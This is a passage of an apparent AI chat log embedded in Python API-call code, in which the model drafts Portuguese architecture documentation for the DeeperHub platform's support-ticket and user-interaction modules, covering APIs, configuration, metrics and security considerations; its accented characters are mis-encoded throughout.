    *   Servi√ßo valida dados, sanitiza, persiste. Notifica o usu√°rio da cria√ß√£o e a equipe de suporte sobre o novo ticket.
*   **Agente de Suporte Responde a um Ticket:**
    *   Agente visualiza o ticket em seu painel.
    *   Escreve uma resposta e atualiza o status (ex: para \"Aguardando Resposta do Usu√°rio\").
    *   API chama `DeeperHub.Support.add_message_to_ticket(agent_id, ticket_id, message_content)` e `DeeperHub.Support.update_ticket_status(ticket_id, new_status, agent_id)`.
    *   Notifica o usu√°rio sobre a nova resposta.
*   **Ticket √© Resolvido:**
    *   Ap√≥s a solu√ß√£o do problema, o agente ou o usu√°rio marca o ticket como resolvido.
    *   API chama `DeeperHub.Support.update_ticket_status(ticket_id, :resolved, agent_or_user_id)`.
    *   (Opcional) Envia uma pesquisa de satisfa√ß√£o.

## üåä 5. Fluxos Importantes

### Fluxo de Cria√ß√£o e Primeira Resposta de um Ticket

1.  **Usu√°rio (UI):** Submete o formul√°rio de novo ticket.
2.  **Controller API:** Chama `DeeperHub.Support.create_ticket(current_user.id, params[\"ticket\"])`.
3.  **`SupportService.create_ticket/2`:**
    *   Verifica rate limit (via `RateLimitIntegration`).
    *   Valida e sanitiza `params[\"ticket\"]` (via `Shared.ContentValidation`).
    *   Cria um `SupportTicketSchema` changeset.
    *   Se v√°lido, `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Chama `NotificationIntegration.notify_ticket_created(ticket, user_id)` -> que usa `DeeperHub.Notifications`.
        *   Publica evento `support.ticket.created` via `Core.EventBus`.
        *   Audita.
        *   Retorna `{:ok, ticket_struct}`.
4.  **Equipe de Suporte (UI Painel):** V√™ o novo ticket.
5.  **Agente de Suporte:** Abre o ticket, escreve uma resposta.
6.  **Controller API (Painel Admin):** Chama `DeeperHub.Support.add_message_to_ticket(current_agent.id, ticket_id, message_params)` e depois `DeeperHub.Support.update_ticket_status(ticket_id, :in_progress, current_agent.id)`.
7.  **`SupportService`:**
    *   Valida e sanitiza a mensagem.
    *   Cria um `TicketMessageSchema` associado ao ticket.
    *   Atualiza o status do `SupportTicketSchema`.
    *   Chama `NotificationIntegration.notify_ticket_replied(ticket, new_message_data)` para notificar o usu√°rio.
    *   Publica eventos e audita.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Support`)

### 6.1. `DeeperHub.Support.create_ticket(user_id :: String.t() | nil, attrs :: map()) :: {:ok, SupportTicket.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descri√ß√£o:** Cria um novo ticket de suporte. `user_id` pode ser `nil` se tickets an√¥nimos forem permitidos.
*   **`attrs`:** `%{subject: String.t(), description: String.t(), category_id: String.t() | nil, priority_id: String.t() | nil, attachments: list(map()) | nil}`.

### 6.2. `DeeperHub.Support.get_ticket(ticket_id :: String.t(), opts :: keyword()) :: {:ok, SupportTicketView.t() | nil}`

*   **Descri√ß√£o:** Obt√©m os detalhes de um ticket, incluindo suas mensagens.
*   **`SupportTicketView.t()`:** Struct do ticket com `messages` pr√©-carregadas e informa√ß√µes de usu√°rio/agente.
*   **`opts`:** `:requesting_user_id` (para verificar permiss√£o de visualiza√ß√£o).

### 6.3. `DeeperHub.Support.list_tickets(filters :: map(), opts :: keyword()) :: {:ok, list(SupportTicketListItem.t()), Pagination.t()}` (Admin/Suporte)

*   **Descri√ß√£o:** Lista tickets para a equipe de suporte.
*   **`filters`:** `:status`, `:priority_id`, `:category_id`, `:assigned_agent_id`, `:user_email_contains`.
*   **`SupportTicketListItem.t()`:** Uma vis√£o resumida do ticket.

### 6.4. `DeeperHub.Support.list_user_tickets(user_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(SupportTicketListItem.t()), Pagination.t()}`

*   **Descri√ß√£o:** Lista os tickets de um usu√°rio espec√≠fico.
*   **`filters`:** `:status`.

### 6.5. `DeeperHub.Support.add_message_to_ticket(actor_id :: String.t(), ticket_id :: String.t(), message_attrs :: map()) :: {:ok, TicketMessage.t()} | {:error, Ecto.Changeset.t() | :unauthorized | :ticket_closed}`

*   **Descri√ß√£o:** Adiciona uma nova mensagem a um ticket existente.
*   **`actor_id`:** ID do usu√°rio ou agente de suporte que est√° adicionando a mensagem.
*   **`message_attrs`:** `%{content: String.t(), attachments: list(map()) | nil, is_internal_note: boolean() | false}`.

### 6.6. `DeeperHub.Support.update_ticket_status(ticket_id :: String.t(), new_status :: atom(), actor_id :: String.t(), opts :: keyword()) :: {:ok, SupportTicket.t()} | {:error, :invalid_transition | term()}`

*   **Descri√ß√£o:** Atualiza o status de um ticket.
*   **`new_status`:** Ex: `:open`, `:in_progress`, `:awaiting_user`, `:resolved`, `:closed`.
*   **`opts`:** `:resolution_notes` (String.t) se o status for `:resolved`.

### 6.7. `DeeperHub.Support.assign_ticket(ticket_id :: String.t(), agent_id :: String.t(), assigning_admin_id :: String.t()) :: {:ok, SupportTicket.t()} | {:error, term()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Atribui um ticket a um agente de suporte.

### 6.8. `DeeperHub.Support.get_ticket_categories() :: {:ok, list(TicketCategory.t())}` (Nova Sugest√£o)
### 6.9. `DeeperHub.Support.get_ticket_priorities() :: {:ok, list(TicketPriority.t())}` (Nova Sugest√£o)

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:support, :enabled]`** (Boolean): Habilita/desabilita o sistema de suporte.
*   **`[:support, :allow_anonymous_tickets]`** (Boolean): Permite que visitantes n√£o logados criem tickets. (Padr√£o: `false`)
*   **`[:support, :default_priority_id]`** (String): ID da prioridade padr√£o para novos tickets.
*   **`[:support, :default_category_id]`** (String): ID da categoria padr√£o.
*   **`[:support, :max_description_length]`** (Integer): Comprimento m√°ximo da descri√ß√£o do ticket.
*   **`[:support, :max_attachments_per_ticket]`** (Integer).
*   **`[:support, :max_attachment_size_mb]`** (Integer).
*   **`[:support, :auto_close_resolved_tickets_after_days]`** (Integer | nil): Dias para fechar automaticamente tickets resolvidos sem resposta do usu√°rio.
*   **`[:support, :sla, :first_response_hours, <priority_id>]`** (Integer): SLA de primeira resposta por prioridade.
*   **`[:support, :sla, :resolution_hours, <priority_id>]`** (Integer): SLA de resolu√ß√£o por prioridade.
*   **`[:support, :notification, :notify_user_on_creation]`** (Boolean).
*   **`[:support, :notification, :notify_agent_on_assignment]`** (Boolean).
*   **`[:support, :notification, :notify_user_on_reply]`** (Boolean).
*   **`[:support, :notification, :support_team_email_group]`** (String): Email do grupo de suporte para notifica√ß√µes de novos tickets.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`: Todos os m√≥dulos Core.
*   `DeeperHub.Accounts`: Para `user_id` e informa√ß√µes do usu√°rio.
*   `DeeperHub.Auth`/`RBAC`: Para permiss√µes de agentes e admins.
*   `DeeperHub.Notifications`: Para todas as notifica√ß√µes de ticket.
*   `DeeperHub.Services.Shared.ContentValidation`: Para validar e sanitizar conte√∫do.
*   `DeeperHub.Support.RateLimitIntegration`.
*   Um servi√ßo de Armazenamento de Arquivos (se houver anexos).
*   `DeeperHub.Audit`.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Interface do Usu√°rio (Se√ß√£o de Ajuda/Suporte):**
    *   Formul√°rio para `create_ticket`.
    *   Listagem para `list_user_tickets`.
    *   Visualiza√ß√£o e adi√ß√£o de mensagens para `get_ticket` e `add_message_to_ticket`.
*   **Painel de Administra√ß√£o/Suporte:**
    *   Dashboard com `list_tickets` e filtros avan√ßados.
    *   Funcionalidades para atribuir, atualizar status, responder e escalar tickets.
*   **Alertas do Sistema:** Outros m√≥dulos podem, em caso de erro persistente ou problema complexo, programaticamente criar um ticket de suporte em nome do usu√°rio ou para a equipe interna.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o ciclo de vida completo de um ticket (cria√ß√£o, respostas, mudan√ßa de status, resolu√ß√£o, fechamento).
*   Testar a l√≥gica de permiss√£o (usu√°rio s√≥ pode ver seus tickets, agente pode ver tickets atribu√≠dos, etc.).
*   Testar a valida√ß√£o e sanitiza√ß√£o de conte√∫do.
*   Testar o envio de notifica√ß√µes em cada etapa.
*   Testar a funcionalidade de anexos.
*   Testar os workers (escala√ß√£o, auto-fechamento).
*   Localiza√ß√£o: `test/deeper_hub/support/`.

### 10.2. M√©tricas

*   `deeper_hub.support.tickets.created.count` (tags: `category_id`, `priority_id`, `channel` (`web`, `api`, `email`))
*   `deeper_hub.support.tickets.resolved.count` (tags: `category_id`)
*   `deeper_hub.support.tickets.closed.count`
*   `deeper_hub.support.tickets.status_changed.count` (tags: `from_status`, `to_status`)
*   `deeper_hub.support.tickets.messages_added.count` (tags: `actor_type` (`user`, `agent`))
*   `deeper_hub.support.tickets.avg_first_response_time_minutes.gauge` (Gauge, tags: `priority_id`)
*   `deeper_hub.support.tickets.avg_resolution_time_hours.gauge` (Gauge, tags: `priority_id`)
*   `deeper_hub.support.tickets.open_tickets.gauge` (Gauge, tags: `priority_id`, `category_id`)

### 10.3. Logs

*   **N√≠vel INFO:** Ticket criado, status alterado, mensagem adicionada.
*   **N√≠vel WARNING:** SLA de primeira resposta ou resolu√ß√£o pr√≥ximo de estourar. Tentativa de a√ß√£o n√£o permitida (ex: usu√°rio tentando fechar ticket de outro).
*   **N√≠vel ERROR:** Falha ao criar ticket, falha ao enviar notifica√ß√£o de ticket.

### 10.4. Telemetria

*   `[:deeper_hub, :support, :ticket, :created | :updated | :status_changed | :message_added]`
    *   Metadados: `%{ticket_id: id, user_id: id, agent_id: id, changes: map}`
*   `[:deeper_hub, :support, :sla, :breached]`
    *   Metadados: `%{ticket_id: id, sla_type: :first_response | :resolution, priority: prio}`

## ‚ùå 11. Tratamento de Erros

*   Falhas de valida√ß√£o ao criar/atualizar retornam `{:error, changeset}`.
*   Opera√ß√µes n√£o autorizadas retornam `{:error, :unauthorized}`.
*   Tentativas de operar em tickets n√£o existentes retornam `{:error, :not_found}`.
*   Falhas no envio de notifica√ß√µes s√£o logadas, mas n√£o devem impedir a opera√ß√£o principal no ticket.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Sanitiza√ß√£o de Conte√∫do:** Todas as descri√ß√µes e mensagens devem ser sanitizadas para prevenir XSS.
*   **Prote√ß√£o de Anexos:** Anexos devem ser escaneados por v√≠rus e ter seu tipo de conte√∫do validado. O acesso a anexos deve ser controlado.
*   **Privacidade dos Dados do Ticket:** Apenas o autor do ticket, agentes atribu√≠dos e administradores com permiss√£o devem poder visualizar o conte√∫do completo de um ticket.
*   **N√£o Incluir Dados Sens√≠veis Desnecess√°rios:** Instruir usu√°rios a n√£o incluir senhas ou outros dados altamente sens√≠veis nos tickets. Se necess√°rio, fornecer um canal seguro separado.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Mantenha a l√≥gica de transi√ß√£o de status clara e bem definida.
*   Garanta que as notifica√ß√µes sejam relevantes e enviadas para as partes corretas.
*   Adicione testes para todos os novos fluxos e valida√ß√µes.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma Base de Conhecimento (FAQ) integrada e sugest√£o de artigos durante a cria√ß√£o do ticket.
*   [ ] Permitir que usu√°rios avaliem a qualidade do suporte recebido ap√≥s a resolu√ß√£o do ticket.
*   [ ] Funcionalidade de \"campos customizados\" para tickets, permitindo que administradores adicionem campos espec√≠ficos para diferentes categorias de problemas.
*   [ ] Integra√ß√£o com email para que usu√°rios possam responder a notifica√ß√µes de ticket por email e suas respostas sejam adicionadas ao ticket.
*   [ ] Atribui√ß√£o autom√°tica de tickets a agentes com base em carga de trabalho, especialidade ou round-robin.
*   [ ] Relat√≥rios mais detalhados para a equipe de suporte (desempenho de agentes, gargalos, etc.).
*   [ ] Suporte a \"tickets internos\" para comunica√ß√£o entre equipes.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

O sistema de suporte √© outra pe√ßa importante para a satisfa√ß√£o do usu√°rio.

Agora, o que acha de explorarmos `DeeperHub.UserInteractions` para ver como os usu√°rios interagem socialmente na plataforma, ou talvez o `DeeperHub.OAuth` para detalhar a autentica√ß√£o com provedores externos?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Excelente! Vamos continuar com o `DeeperHub.UserInteractions`. Este m√≥dulo √© focado nas funcionalidades sociais e de intera√ß√£o entre os usu√°rios da plataforma DeeperHub.

---

# M√≥dulo: `DeeperHub.UserInteractions` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.UserInteractions`

O m√≥dulo `DeeperHub.UserInteractions` gerencia as **intera√ß√µes sociais e engajamentos entre os usu√°rios** da plataforma DeeperHub, bem como as intera√ß√µes dos usu√°rios com entidades como servidores. Ele abrange funcionalidades como seguir servidores, adicionar servidores aos favoritos, enviar mensagens privadas, dar feedback, fazer recomenda√ß√µes e reportar conte√∫do ou usu√°rios.

O objetivo deste m√≥dulo √© enriquecer a experi√™ncia social na plataforma, permitir que os usu√°rios se conectem, compartilhem opini√µes e ajudem a manter a comunidade segura e relevante. üòä

*(Nota: Na documenta√ß√£o original, este era `DeeperHub.Services.UserInteractions`. Estamos tratando-o como um contexto de dom√≠nio mais amplo.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Favoritar Servidores (`add_favorite/2`, `remove_favorite/2`, `list_favorites/2`, `is_favorite?/2`):**
    *   Permitir que usu√°rios marquem servidores como favoritos.
    *   Listar os servidores favoritos de um usu√°rio.
    *   Verificar se um usu√°rio favoritou um servidor espec√≠fico.
*   **Seguir Servidores (Nova Sugest√£o, similar a favoritos mas com sem√¢ntica de \"receber atualiza√ß√µes\"):**
    *   Permitir que usu√°rios sigam servidores para receber notifica√ß√µes sobre suas atualiza√ß√µes ou eventos.
    *   Gerenciar a lista de seguidores de um servidor e servidores seguidos por um usu√°rio.
*   **Mensagens Diretas entre Usu√°rios (Chat) (`send_chat_message/1`, `list_chat_messages/3`):**
    *   Permitir que usu√°rios enviem e recebam mensagens diretas uns dos outros.
    *   Manter o hist√≥rico de conversas.
    *   (Opcional) Indica√ß√£o de status (online, offline, digitando).
    *   (Opcional) Notifica√ß√µes de novas mensagens.
*   **Recomenda√ß√µes de Servidores (`create_or_update_recommendation/1`, `list_recommendations_for_user/2`):**
    *   Permitir que usu√°rios recomendem servidores para outros usu√°rios ou para a comunidade.
    *   O sistema pode gerar recomenda√ß√µes autom√°ticas com base no comportamento do usu√°rio ou similaridade.
*   **Feedback sobre a Plataforma (`submit_feedback/1`, `list_feedback/1`):**
    *   Permitir que usu√°rios enviem feedback geral sobre a plataforma DeeperHub (sugest√µes, bugs, usabilidade).
*   **Den√∫ncias (Reports) de Conte√∫do ou Usu√°rios (`create_report/1`, `list_reports/1`):**
    *   Permitir que usu√°rios denunciem servidores, reviews, mensagens de chat, ou outros usu√°rios por comportamento inadequado ou viola√ß√£o das diretrizes.
    *   Gerenciar o fluxo de modera√ß√£o dessas den√∫ncias.
*   **Rea√ß√µes (Likes/Dislikes/Votos) em Conte√∫do (Nova Sugest√£o, ou parte de cada m√≥dulo de conte√∫do):**
    *   Permitir que usu√°rios reajam (ex: curtir, dar um upvote/downvote) a reviews, mensagens de atualiza√ß√£o de servidor, etc.
*   **Listas de Amigos/Conex√µes (Nova Sugest√£o):**
    *   Permitir que usu√°rios adicionem outros como amigos ou conex√µes.
    *   Visualizar a atividade de amigos (com controle de privacidade).
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar intera√ß√µes.
    *   Publicar eventos de dom√≠nio (ex: `user.favorited_server`, `chat.message_sent`).
    *   Auditar den√∫ncias e a√ß√µes de modera√ß√£o.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.UserInteractions` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes de intera√ß√£o social.
    *   Delega para o `UserInteractionsService`.
2.  **`DeeperHub.UserInteractions.Services.UserInteractionsService` (ou `DefaultUserInteractionsService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio para as diferentes intera√ß√µes.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com os schemas de intera√ß√£o (`FavoriteSchema`, `ChatMessageSchema`, `FeedbackSchema`, `RecommendationSchema`, `ReportSchema`, etc.).
        *   `DeeperHub.Accounts`: Para validar `user_id` e obter informa√ß√µes de usu√°rio.
        *   `DeeperHub.Servers`: Para validar `server_id` ao favoritar/recomendar.
        *   `DeeperHub.Auth`/`RBAC`: Para verificar permiss√µes (ex: se um usu√°rio pode enviar mensagem para outro, se moderador pode ver den√∫ncias).
        *   `DeeperHub.Notifications`: Para notificar usu√°rios sobre novas mensagens, feedback respondido, etc.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos de intera√ß√£o.
        *   `DeeperHub.Core.Cache`: Para cachear dados como listas de favoritos ou contagens de rea√ß√µes.
3.  **Schemas Ecto:**
    *   **`DeeperHub.UserInteractions.Schemas.FavoriteSchema`:** (`user_id`, `server_id`, `added_at`).
    *   **`DeeperHub.UserInteractions.Schemas.FollowSchema` (Nova):** (`follower_user_id`, `followed_entity_type` (ex: `:server`, `:user`), `followed_entity_id`, `followed_at`).
    *   **`DeeperHub.UserInteractions.Schemas.ChatMessageSchema`:** (`sender_id`, `receiver_id`, `content`, `sent_at`, `read_at`).
    *   **`DeeperHub.UserInteractions.Schemas.FeedbackSchema`:** (`user_id` (opcional), `type` (`:bug`, `:suggestion`, `:complaint`), `content`, `status` (`:new`, `:in_progress`, `:resolved`), `submitted_at`).
    *   **`DeeperHub.UserInteractions.Schemas.RecommendationSchema`:** (`recommender_user_id`, `recommended_server_id`, `target_user_id` (opcional, se for para um usu√°rio espec√≠fico), `reason`, `score` (opcional), `created_at`).
    *   **`DeeperHub.UserInteractions.Schemas.ReportSchema`:** (`reporter_user_id`, `reported_entity_type` (`:user`, `:server`, `:review`, `:chat_message`), `reported_entity_id`, `reason_category`, `details`, `status` (`:pending_review`, `:action_taken`, `:dismissed`), `submitted_at`).
    *   **`DeeperHub.UserInteractions.Schemas.ReactionSchema` (Nova):** (`user_id`, `target_entity_type`, `target_entity_id`, `reaction_type` (`:like`, `:dislike`, `:helpful`, etc.), `created_at`).
    *   **`DeeperHub.UserInteractions.Schemas.FriendshipSchema` (Nova):** (`user1_id`, `user2_id`, `status` (`:pending`, `:accepted`, `:blocked`), `requested_at`, `accepted_at`).
4.  **`DeeperHub.UserInteractions.Storage` (ou l√≥gica no `UserInteractionsService`):**
    *   Encapsula as queries Ecto.
5.  **Workers (Opcional):**
    *   `NotificationDispatcherWorker`: Para enviar notifica√ß√µes de novas mensagens de chat ou outras intera√ß√µes de forma ass√≠ncrona.
    *   `ReportModerationQueueWorker`: Para processar den√∫ncias e atribu√≠-las a moderadores.
    *   `RecommendationEngineWorker`: Para gerar recomenda√ß√µes autom√°ticas em background.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/user_interactions/
‚îú‚îÄ‚îÄ user_interactions.ex              # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ user_interactions_service.ex  # Servi√ßo principal
‚îÇ   # Potencialmente, servi√ßos mais espec√≠ficos: ChatService, ReportService, etc.
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îú‚îÄ‚îÄ favorite_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ follow_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ chat_message_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ feedback_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ recommendation_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ report_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ reaction_schema.ex
‚îÇ   ‚îî‚îÄ‚îÄ friendship_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional)
‚îÇ
‚îú‚îÄ‚îÄ workers/                          # Opcional
‚îÇ   ‚îú‚îÄ‚îÄ notification_dispatcher_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ report_moderation_queue_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Privacidade:** As intera√ß√µes, especialmente mensagens diretas e den√∫ncias, devem ser tratadas com alta considera√ß√£o pela privacidade.
*   **Modera√ß√£o:** Um sistema robusto de modera√ß√£o √© essencial para den√∫ncias e, potencialmente, para outro conte√∫do gerado pelo usu√°rio que possa surgir de intera√ß√µes.
*   **Escalabilidade do Chat:** Se o chat for uma feature principal, pode precisar de uma arquitetura mais especializada (ex: usando Phoenix Channels, um backend de mensagens dedicado) em vez de simples armazenamento no DB.
*   **Notifica√ß√µes Granulares:** Os usu√°rios devem poder controlar quais tipos de notifica√ß√µes de intera√ß√£o eles recebem.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Usu√°rio Favorita um Servidor:**
    *   Na p√°gina do servidor, usu√°rio clica em \"Favoritar\".
    *   API chama `UserInteractions.add_favorite(user_id, server_id)`.
*   **Usu√°rio Envia uma Mensagem Direta para Outro Usu√°rio:**
    *   Na interface de chat, usu√°rio_A envia \"Ol√°!\" para usu√°rio_B.
    *   API chama `UserInteractions.send_chat_message(%{sender_id: \"A\", receiver_id: \"B\", content: \"Ol√°!\"})`.
    *   O sistema envia uma notifica√ß√£o (push/in-app) para usu√°rio_B.
*   **Usu√°rio Denuncia uma Review de Servidor:**
    *   Usu√°rio clica em \"Denunciar\" em uma review.
    *   Preenche motivo e detalhes.
    *   API chama `UserInteractions.create_report(%{reporter_user_id: \"uid\", reported_entity_type: :review, reported_entity_id: \"review_id\", ...})`.
    *   Uma notifica√ß√£o √© enviada para a equipe de modera√ß√£o.
*   **Sistema Sugere um Servidor para um Usu√°rio:**
    *   `RecommendationEngineWorker` analisa o hist√≥rico do usu√°rio.
    *   Chama `UserInteractions.create_or_update_recommendation(%{recommender_user_id: \"system\", recommended_server_id: \"server_xyz\", target_user_id: \"uid\", reason: \"Baseado em seus favoritos\"})`.

## üåä 5. Fluxos Importantes

### Fluxo de Envio de Mensagem de Chat

1.  **Usu√°rio A (UI):** Envia a mensagem \"Ol√°!\" para Usu√°rio B.
2.  **Controller API:** Recebe a requisi√ß√£o. Chama `DeeperHub.UserInteractions.send_chat_message(%{sender_id: \"A\", receiver_id: \"B\", content: \"Ol√°!\"})`.
3.  **`UserInteractionsService.send_chat_message/1`:**
    *   Valida se o remetente pode enviar mensagem para o destinat√°rio (ex: n√£o bloqueado, ambos existem).
    *   Sanitiza o `content` (via `Shared.ContentValidation`).
    *   Cria um `ChatMessageSchema` changeset.
    *   Persiste a mensagem via `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Enfileira uma notifica√ß√£o para o `receiver_id` (via `DeeperHub.Notifications`, possivelmente por um `NotificationDispatcherWorker` para n√£o bloquear).
        *   Publica evento `chat.message_sent` no `Core.EventBus`.
        *   Retorna `{:ok, chat_message_struct}`.
4.  **Usu√°rio B:** Recebe a notifica√ß√£o (push ou in-app) e sua UI de chat √© atualizada.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.UserInteractions`)

### 6.1. Favoritos e Seguir

*   `add_favorite(user_id, server_id)`
*   `remove_favorite(user_id, server_id)`
*   `list_user_favorites(user_id, opts)`
*   `is_favorite?(user_id, server_id)`
*   `follow_server(user_id, server_id)` (Nova)
*   `unfollow_server(user_id, server_id)` (Nova)
*   `list_user_followed_servers(user_id, opts)` (Nova)

### 6.2. Mensagens de Chat

*   `send_chat_message(attrs :: %{sender_id: String.t(), receiver_id: String.t(), content: String.t()})`
*   `list_chat_messages(user_id_A :: String.t(), user_id_B :: String.t(), opts :: keyword())`
*   `mark_chat_messages_as_read(user_id_viewer :: String.t(), other_user_id :: String.t(), up_to_message_id :: String.t() | nil)` (Nova)

### 6.3. Recomenda√ß√µes

*   `create_or_update_recommendation(attrs :: %{recommender_user_id: String.t(), recommended_server_id: String.t(), target_user_id: String.t() | nil, reason: String.t(), score: float() | nil})`
*   `list_recommendations_for_user(user_id, opts)`
*   `list_recommendations_from_user(user_id, opts)` (Nova)

### 6.4. Feedback da Plataforma

*   `submit_feedback(attrs :: %{user_id: String.t() | nil, type: atom(), content: String.t(), contact_email: String.t() | nil})`
*   `list_feedback(filters, opts)` (Admin)
*   `update_feedback_status(feedback_id, new_status, admin_id)` (Admin)

### 6.5. Den√∫ncias (Reports)

*   `create_report(attrs :: %{reporter_user_id: String.t(), reported_entity_type: atom(), reported_entity_id: String.t(), reason_category: String.t(), details: String.t()})`
*   `list_reports(filters, opts)` (Admin/Moderador)
*   `update_report_status(report_id, new_status, moderator_id, action_taken_notes :: String.t() | nil)` (Admin/Moderador)

### 6.6. Rea√ß√µes (Nova API Sugerida)

*   `add_reaction(user_id, target_entity_type, target_entity_id, reaction_type)`
*   `remove_reaction(user_id, target_entity_type, target_entity_id, reaction_type)`
*   `get_reactions_for_entity(target_entity_type, target_entity_id)` (Retorna contagens por tipo de rea√ß√£o)

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:user_interactions, :chat, :enabled]`** (Boolean).
*   **`[:user_interactions, :chat, :max_message_length]`** (Integer).
*   **`[:user_interactions, :favorites, :max_per_user]`** (Integer).
*   **`[:user_interactions, :reports, :categories]`** (List de Strings): Categorias de den√∫ncia permitidas.
*   **`[:user_interactions, :reports, :notify_moderators_on_new_report]`** (Boolean).
*   **`[:user_interactions, :feedback, :allowed_types]`** (List de Atoms).
*   **`[:user_interactions, :recommendations, :max_user_recommendations]`** (Integer).
*   **`[:user_interactions, :rate_limit, <action>, :limit | :window_seconds]`**: Configs de rate limit para a√ß√µes como `send_chat_message`, `create_report`.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`: Todos os m√≥dulos Core.
*   `DeeperHub.Accounts`: Para `user_id` e perfis de usu√°rio.
*   `DeeperHub.Servers`: Para `server_id` em favoritos, recomenda√ß√µes, den√∫ncias.
*   `DeeperHub.Auth`/`RBAC`: Para permiss√µes (ex: quem pode ver/gerenciar den√∫ncias).
*   `DeeperHub.Notifications`: Para notificar sobre novas mensagens, status de den√∫ncias, etc.
*   `DeeperHub.Services.Shared.ContentValidation`: Para validar e sanitizar conte√∫do de mensagens, feedback, den√∫ncias.
*   `DeeperHub.Audit`.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Se o chat for em tempo real, `Phoenix.PubSub` ou `Phoenix.Presence` podem ser usados internamente.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **UI do Usu√°rio:** V√°rias se√ß√µes da UI (perfil do servidor, perfil do usu√°rio, chat, central de ajuda) chamar√£o endpoints da API que usam este m√≥dulo.
*   **Painel de Modera√ß√£o/Administra√ß√£o:** Para visualizar e gerenciar den√∫ncias e feedback.
*   **Sistema de Notifica√ß√µes:** O `UserInteractionsService` frequentemente chamar√° `DeeperHub.Notifications` para informar usu√°rios sobre novas mensagens, respostas a feedback, status de den√∫ncias, etc.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada funcionalidade principal: favoritos, chat (envio, listagem), feedback, recomenda√ß√µes, den√∫ncias.
*   Testar a l√≥gica de permiss√£o (ex: usu√°rio n√£o pode ver chat de outros, apenas moderador v√™ todas as den√∫ncias).
*   Testar valida√ß√£o e sanitiza√ß√£o de conte√∫do.
*   Testar a intera√ß√£o com notifica√ß√µes.
*   Localiza√ß√£o: `test/deeper_hub/user_interactions/`.

### 10.2. M√©tricas

*   `deeper_hub.user_interactions.favorites.added.count`
*   `deeper_hub.user_interactions.chat_messages.sent.count`
*   `deeper_hub.user_interactions.feedback.submitted.count` (tags: `type`)
*   `deeper_hub.user_interactions.reports.created.count` (tags: `entity_type`, `reason_category`)
*   `deeper_hub.user_interactions.recommendations.created.count`
*   `deeper_hub.user_interactions.reactions.added.count` (tags: `entity_type`, `reaction_type`)

### 10.3. Logs

*   **N√≠vel INFO:** Nova intera√ß√£o criada (favorito, mensagem, feedback, den√∫ncia).
*   **N√≠vel WARNING:** Tentativa de a√ß√£o n√£o permitida (ex: enviar mensagem para usu√°rio bloqueado). Den√∫ncia recebida para conte√∫do/usu√°rio.
*   **N√≠vel ERROR:** Falha ao persistir uma intera√ß√£o.

### 10.4. Telemetria

*   `[:deeper_hub, :user_interactions, <interaction_type>, :created | :deleted]`
    *   Ex: `[:deeper_hub, :user_interactions, :favorite, :created]`
    *   Metadados: `%{user_id: id, target_id: id_if_applicable, details: ...}`
*   `[:deeper_hub, :user_interactions, :report, :status_changed]`
    *   Metadados: `%{report_id: id, new_status: status, moderator_id: id}`

## ‚ùå 11. Tratamento de Erros

*   Falhas de valida√ß√£o retornam `{:error, changeset}`.
*   Opera√ß√µes n√£o autorizadas retornam `{:error, :unauthorized}`.
*   Erros ao enviar notifica√ß√µes s√£o logados, mas a intera√ß√£o principal (ex: envio de mensagem) deve ser bem-sucedida se poss√≠vel.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Privacidade das Mensagens de Chat:** Mensagens diretas devem ser confidenciais e acess√≠veis apenas pelos participantes e, em casos espec√≠ficos, por administradores/moderadores com justificativa (ex: investiga√ß√£o de den√∫ncia). Criptografia de ponta-a-ponta √© uma considera√ß√£o avan√ßada se a privacidade for extrema.
